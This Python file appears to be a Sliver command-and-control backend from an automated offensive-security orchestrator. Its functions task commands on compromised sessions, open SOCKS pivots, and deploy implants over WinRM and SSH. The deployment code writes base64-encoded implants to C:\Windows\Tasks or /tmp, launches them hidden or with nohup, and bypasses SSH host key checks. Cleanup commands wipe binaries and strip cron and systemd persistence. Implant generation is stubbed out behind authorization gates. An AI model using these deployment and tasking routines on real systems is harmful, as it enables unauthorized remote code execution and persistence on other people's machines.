
# --- P1 DEPRECATION MARKER (per v4 section 12.2 P1.2) ---
# SUB-06: UNREACHABLE_FROM_CANONICAL (P0 inventory).
# See evidence/phases/P0/02_execution_inventory/subprocess_sites.md.
# Disposition: deprecate; verify zero canonical references; delete at P9.1.
# No canonical Runtime path reaches this site (v4 INV-5/INV-6).
# Do not import from canonical code (v4 INV-11).
# -------------------------------------------------------


# --- P1 DEPRECATION MARKER (per v4 section 12.2 P1.2) ---
# SUB-05: UNREACHABLE_FROM_CANONICAL (P0 inventory).
# See evidence/phases/P0/02_execution_inventory/subprocess_sites.md.
# Disposition: deprecate; verify zero canonical references; delete at P9.1.
# No canonical Runtime path reaches this site (v4 INV-5/INV-6).
# Do not import from canonical code (v4 INV-11).
# -------------------------------------------------------

import asyncio
import base64
import os
import shlex
import subprocess
import tempfile
import time
import uuid
from typing import Optional

from .models import C2Session, ImplantConfig, TaskResult, SessionStatus


class SliverBackend:
    def __init__(self, config_path: str = ""):
        self._name = "sliver"
        self._config_path = config_path or os.getenv("SLIVER_OPERATOR_CONFIG", "")
        self._client = None
        self._available = False

    @property
    def available(self) -> bool:
        return self._available

    async def _ensure_client(self):
        if self._client is not None:
            return
        try:
            from sliver import SliverClient
            from sliver.config import SliverClientConfig
            config_path = self._config_path if (self._config_path and os.path.exists(self._config_path)) else None
            config_b64 = os.getenv("SLIVER_OPERATOR_CONFIG_B64", "")
            if config_path:
                config = SliverClientConfig.parse_config_file(config_path)
            elif config_b64:
                import json
                cfg_data = base64.b64decode(config_b64).decode()
                config = SliverClientConfig.from_json(cfg_data)
            else:
                self._available = False
                return
            self._client = SliverClient(config)
            await self._client.connect()
            self._available = True
        except Exception as e:
            self._client = None
            self._available = False

    async def list_sessions(self) -> list[C2Session]:
        await self._ensure_client()
        if not self._available:
            return []
        try:
            sessions = await self._client.sessions()
            return [
                C2Session(
                    id=s.ID,
                    hostname=s.Hostname,
                    address=s.RemoteAddress,
                    os=s.OS,
                    arch=s.Arch,
                    transport=s.Transport,
                    status=SessionStatus.ALIVE,
                    last_checkin=time.time(),
                )
                for s in sessions
                if not s.IsDead
            ]
        except Exception:
            self._available = False
            return []

    async def _import_config(self):
        # AM-4-R2: legacy sliver-client import body DELETED (was
        # create_subprocess_exec). Zero callers remain (generate_implant
        # gutted). No execution path remains.
        from orchestrator.auth import WeldNotAuthorized
        raise WeldNotAuthorized(
            "AM-4 W-08 R3.0-P11: sliver _import_config branch deleted; "
            "all execution routes through the broker-gated capability."
        )

    async def generate_implant(self, config: ImplantConfig) -> bytes:
        # AM-4-R2 W-08 (R3.0-P11) internal-sink defense (§4): no alternate
        # production bypass around the gated bridge entry. Fail-closed.
        from orchestrator.auth import enforce_broker_mediation, WeldNotAuthorized
        enforce_broker_mediation(
            target="c2-sliver",
            action_type="c2_build",
            capability="c2.sliver_backend",
            method="generate_implant",
            impact_estimate=9.0,
            path_id="R3.0-P11",
            weld_ticket="W-08",
        )
        # AM-4-R2: legacy sliver-client exec body DELETED (was
        # create_subprocess_exec + script-file write/unlink). No execution
        # path remains past the gate.
        raise WeldNotAuthorized(
            "AM-4 W-08 R3.0-P11: sliver generate_implant branch deleted; "
            "all execution routes through the broker-gated capability."
        )

    async def send_task(self, session_id: str, command: str) -> TaskResult:
        # AM-4-R2 W-08 (R3.0-P11) internal-sink defense (§4). Fail-closed.
        from orchestrator.auth import enforce_broker_mediation
        enforce_broker_mediation(
            target="c2-sliver",
            action_type="c2_task",
            capability="c2.sliver_backend",
            method="send_task",
            impact_estimate=9.0,
            path_id="R3.0-P11",
            weld_ticket="W-08",
        )
        await self._ensure_client()
        if not self._available:
            return TaskResult(session_id=session_id, task_id="", output="", error="No C2 backend", completed=False)
        try:
            t0 = time.time()
            task = await self._client.execute(session_id, command, timeout=60)
            output = task.get_output() or ""
            return TaskResult(
                session_id=session_id,
                task_id=task.ID,
                output=output[:50000],
                duration=time.time() - t0,
            )
        except Exception as e:
            return TaskResult(session_id=session_id, task_id="", output="", error=str(e), completed=False)

    async def socks_start(self, session_id: str, port: int = 1081) -> Optional[str]:
        await self._ensure_client()
        if not self._available:
            return None
        try:
            await self._client.socks_start(session_id, port)
            return f"socks5h://127.0.0.1:{port}"
        except Exception:
            return None

    async def socks_stop(self, session_id: str):
        await self._ensure_client()
        if not self._available:
            return
        try:
            await self._client.socks_stop(session_id)
        except Exception:
            pass

    async def deploy_implant_winrm(self, target: str, username: str, password: str,
                                     transport: str = "mtls", os_type: str = "windows") -> Optional[str]:
        # AM-4-R2 W-08 (R3.0-P11) internal-sink defense (§4). Fail-closed.
        from orchestrator.auth import enforce_broker_mediation
        enforce_broker_mediation(
            target=target,
            action_type="c2_deploy",
            capability="c2.sliver_backend",
            method="deploy_implant_winrm",
            impact_estimate=9.0,
            path_id="R3.0-P11",
            weld_ticket="W-08",
        )
        cfg = ImplantConfig(os=os_type, arch="amd64", name=f"implant-{target.replace('.','-')}",
                            format="exe", transport=transport)
        implant_bytes = await self.generate_implant(cfg)
        if not implant_bytes:
            return None

        try:
            b64 = base64.b64encode(implant_bytes).decode()
            remote_path = f"C:\\Windows\\Tasks\\{uuid.uuid4().hex[:8]}.exe"
            ps_cmd = (
                f"$b = [Convert]::FromBase64String('{b64}'); "
                f"[IO.File]::WriteAllBytes('{remote_path}', $b); "
                f"Start-Process -WindowStyle Hidden '{remote_path}'"
            )
            from ..kali_tools_client import kali
            result = await kali.run("netexec", (
                f"winrm {shlex.quote(target)} "
                f"-u {shlex.quote(username)} -p {shlex.quote(password)} "
                f"-X {shlex.quote('powershell -EncodedCommand ' + base64.b64encode(ps_cmd.encode()).decode())}"
            ), timeout=120)
            if "error" not in result:
                return remote_path
        except Exception:
            pass
        return None

    async def deploy_implant_ssh(self, target: str, username: str, password_or_key: str,
                                  transport: str = "mtls", os_type: str = "linux") -> Optional[str]:
        # AM-4-R2 W-08 (R3.0-P11) internal-sink defense (§4). Fail-closed.
        from orchestrator.auth import enforce_broker_mediation
        enforce_broker_mediation(
            target=target,
            action_type="c2_deploy",
            capability="c2.sliver_backend",
            method="deploy_implant_ssh",
            impact_estimate=9.0,
            path_id="R3.0-P11",
            weld_ticket="W-08",
        )
        cfg = ImplantConfig(os=os_type, arch="amd64", name=f"implant-{target.replace('.','-')}",
                            format="exe", transport=transport)
        implant_bytes = await self.generate_implant(cfg)
        if not implant_bytes:
            return None

        try:
            b64 = base64.b64encode(implant_bytes).decode()
            remote_path = f"/tmp/{uuid.uuid4().hex[:8]}"
            from ..kali_tools_client import kali
            deploy_cmd = (
                f"sshpass -p {shlex.quote(password_or_key)} ssh -o StrictHostKeyChecking=no "
                f"{shlex.quote(username)}@{shlex.quote(target)} "
                f"{shlex.quote(f'base64 -d > {remote_path} <<< {b64} && chmod +x {remote_path} && nohup {remote_path} >/dev/null 2>&1 &')}"
            )
            result = await kali.run("bash", f"-c {shlex.quote(deploy_cmd)}", timeout=120)
            if "error" not in result:
                return remote_path
        except Exception:
            pass
        return None

    async def cleanup_implant(self, target: str, username: str, password_or_key: str,
                               remote_path: str, os_type: str = "linux") -> bool:
        """Remove implant from remote system: kill process, delete binary, remove persistence."""
        # AM-4-R2 W-08 (R3.0-P11) internal-sink defense (§4). Fail-closed.
        from orchestrator.auth import enforce_broker_mediation
        enforce_broker_mediation(
            target=target,
            action_type="c2_task",
            capability="c2.sliver_backend",
            method="cleanup_implant",
            impact_estimate=9.0,
            path_id="R3.0-P11",
            weld_ticket="W-08",
        )
        if os_type == "windows":
            ps_cmd = (
                f"Stop-Process -Name $(Get-Process | Where-Object {{$_.Path -eq '{remote_path}'}}) -Force -ErrorAction SilentlyContinue; "
                f"Remove-Item -Force '{remote_path}' -ErrorAction SilentlyContinue; "
                f"schtasks /Delete /TN 'RaphaelImplant' /F 2>$null; "
                f"Remove-Item -Force 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\raphael_implant.*' -ErrorAction SilentlyContinue"
            )
            from ..kali_tools_client import kali
            result = await kali.run("netexec", (
                f"winrm {shlex.quote(target)} "
                f"-u {shlex.quote(username)} -p {shlex.quote(password_or_key)} "
                f"-X {shlex.quote('powershell -EncodedCommand ' + base64.b64encode(ps_cmd.encode()).decode())}"
            ), timeout=60)
            return "error" not in result
        else:
            cleanup_script = (
                f"kill $(fuser {remote_path} 2>/dev/null) 2>/dev/null; "
                f"dd if=/dev/urandom of={remote_path} bs=1k count=1 2>/dev/null; "
                f"rm -f {remote_path}; "
                f"sed -i '/raphael_implant/d' /etc/crontab /var/spool/cron/crontabs/* 2>/dev/null; "
                f"rm -f /etc/systemd/system/raphael* /etc/init.d/raphael* 2>/dev/null"
            )
            ssh_cmd = (
                f"sshpass -p {shlex.quote(password_or_key)} ssh -o StrictHostKeyChecking=no "
                f"{shlex.quote(username)}@{shlex.quote(target)} "
                f"{shlex.quote(cleanup_script)}"
            )
            from ..kali_tools_client import kali
            result = await kali.run("bash", f"-c {shlex.quote(ssh_cmd)}", timeout=60)
            return "error" not in result

    async def stop(self):
        if self._client:
            try:
                await self._client._channel.close()
            except Exception:
                raise RuntimeError("Not implemented")
